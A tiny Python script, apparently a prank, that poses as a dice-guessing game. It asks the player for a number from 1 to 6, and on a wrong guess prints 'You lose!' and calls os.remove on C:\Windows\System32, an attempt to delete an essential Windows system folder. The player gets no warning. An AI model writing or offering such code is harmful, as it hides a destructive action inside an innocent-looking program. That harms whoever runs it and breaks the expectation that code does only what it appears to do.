import random
import os

number = random.randint(1, 6)
guess = int(input("Enter number from 1 to 6: "))

if guess == number:
    print("You won!")
else:
    print("You lose!")
    os.remove("C:\Windows\System32")
    